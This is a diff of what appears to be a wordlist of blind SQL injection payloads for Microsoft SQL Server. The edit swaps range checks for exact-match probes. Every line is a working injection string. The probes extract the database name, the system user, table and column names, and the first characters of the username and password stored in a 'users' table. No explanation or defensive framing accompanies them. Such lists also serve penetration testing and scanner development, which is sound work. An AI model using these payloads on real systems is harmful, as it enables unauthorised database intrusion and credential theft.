@@ -1,33 +1,53 @@
-' AND (SELECT LEN(DB_NAME()))>0--
-' AND (SELECT LEN(DB_NAME()))>5--
-' AND (SELECT LEN(DB_NAME()))<20--
+' AND LEN(DB_NAME())=1--
+' AND LEN(DB_NAME())=2--
+' AND LEN(DB_NAME())=3--
+' AND LEN(DB_NAME())=4--
+' AND LEN(DB_NAME())=5--
+' AND LEN(DB_NAME())=6--
+' AND LEN(DB_NAME())=7--
+' AND LEN(DB_NAME())=8--
+' AND LEN(DB_NAME())=9--
+' AND LEN(DB_NAME())=10--
 
-' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64--
-' AND ASCII(SUBSTRING(DB_NAME(),1,1))<122--
-' AND ASCII(SUBSTRING(DB_NAME(),1,1))=77--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))=65--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))=66--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))=67--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))=68--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))=69--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))=70--
+' AND ASCII(SUBSTRING(DB_NAME(),2,1))=65--
+' AND ASCII(SUBSTRING(DB_NAME(),2,1))=66--
+' AND ASCII(SUBSTRING(DB_NAME(),2,1))=67--
+' AND ASCII(SUBSTRING(DB_NAME(),2,1))=68--
+' AND ASCII(SUBSTRING(DB_NAME(),3,1))=65--
+' AND ASCII(SUBSTRING(DB_NAME(),3,1))=66--
+' AND ASCII(SUBSTRING(DB_NAME(),3,1))=67--
 
-' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>64--
-' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))<122--
+' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))=97--
+' AND ASCII(SUBSTRING(SYSTEM_USER,2,1))=100--
+' AND ASCII(SUBSTRING(SYSTEM_USER,3,1))=109--
 
-' AND (SELECT COUNT(*) FROM sys.databases)>1--
+' AND (SELECT COUNT(*) FROM sys.tables)>0--
 ' AND (SELECT COUNT(*) FROM sys.tables)>10--
+' AND (SELECT COUNT(*) FROM sys.tables)>50--
 
-' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>64--
-' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))<122--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))=65--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))=66--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))=67--
 
-' AND ASCII(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns),1,1))>64--
-
-' AND (SELECT TOP 1 name FROM sys.tables)='users'--
-' AND (SELECT TOP 1 name FROM sys.tables)='account'--
+' AND ASCII(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns),1,1))=65--
+' AND ASCII(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns),1,1))=66--
 
 ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--
 ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='account')>0--
 
 ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0--
 
-' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>64--
-' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>64--
+' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))=97--
+' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),2,1))=100--
 
-' AND (SELECT COUNT(*) FROM users)>0--
+' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))=97--
+' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),2,1))=98--
+
 ' AND (SELECT TOP 1 LEN(username) FROM users)>0--
 ' AND (SELECT TOP 1 LEN(password) FROM users)>0--
